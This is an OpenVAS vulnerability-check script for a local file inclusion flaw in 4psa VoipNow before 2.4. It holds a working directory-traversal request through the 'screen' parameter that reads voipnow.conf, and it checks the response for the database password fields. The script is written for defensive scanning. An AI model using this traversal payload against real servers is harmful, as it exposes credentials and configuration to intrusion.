###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_4psa_voipnow_lfi_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# 4psa Voipnow Local File Inclusion Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow an attacker to view files and execute
  local scripts in the context of the application.
  Impact Level: Application";

tag_affected = "4psa voipnow version prior to 2.4";
tag_insight = "The flaw is due to an improper validation of user-supplied input to
  the 'screen' parameter in '/help/index.php?', which allows attackers
  to read arbitrary files via a ../(dot dot) sequences.";
tag_solution = "Upgrade to 4psa voipnow 2.4 or later,
  For updates refer to http://www.4psa.com/products-voipnow-spe.html";
tag_summary = "This host is running 4psa Voipnow and is prone to local file
  inclusion vulnerability.";

if(description)
{
  script_id(803195);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-04-22 18:28:32 +0530 (Mon, 22 Apr 2013)");
  script_name("4psa Voipnow Local File Inclusion Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/92646");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121374");
  script_xref(name : "URL" , value : "http://bot24.blogspot.in/2013/04/voipnow-24-local-file-inclusion.html");
  script_description(desc);
  script_summary("Read the content of the configuration file voipnow.conf");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 443);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("openvas-https.inc");
include("http_keepalive.inc");

port = "";
req = "";
res = "";
host = "";

## Get HTTP Port
port = get_http_port(default:443);
if(!port){
  port = 443;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

req = http_get(item:"/", port:port);
res = https_req_get(port:port, request:req);

## Confirm the application before trying the exploit
if("VOIPNOW=" >< res && "Server: voipnow" >< res)
{
  url = '/help/index.php?screen=../../../../../../../../etc/voipnow/voipnow.conf';
  req = string("GET ", url," HTTP/1.1\r\n",
               "Host: ", host, "\r\n");

  res = https_req_get(port:port, request:req);

  ## Confirm the exploit
  if("VOIPNOWCALLAPID_RC_D" >< res && "VOIPNOW_ROOT_D" >< res &&
     'Database location' >< res && "DB_PASSWD" >< res)
  {
    security_hole(port:port);
    exit(0);
  }
}
